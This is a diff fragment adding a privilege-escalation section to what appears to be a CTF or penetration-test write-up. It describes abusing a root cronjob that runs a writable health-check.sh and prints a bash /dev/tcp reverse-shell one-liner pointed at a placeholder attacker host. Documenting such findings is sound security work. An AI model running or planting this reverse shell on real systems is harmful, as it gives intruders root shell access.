@@ -167,3 +167,10 @@ DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1001/bus
 SSH_TTY=/dev/pts/0
 _=/usr/bin/printenv
 ```
+# Privilege escalation
+## Cronjob health-check.sh
+The crontab was set to execute the health-check.sh every minute (`*/1 * * * *`)
+ as root. Since health-check.sh was writable by the `ftp-user` we were able to inject a reverse shell into it:
+ ```sh
+ sh -i >& /dev/tcp/<attacker_machine>/<attacker_port> 0>&1
+``` 
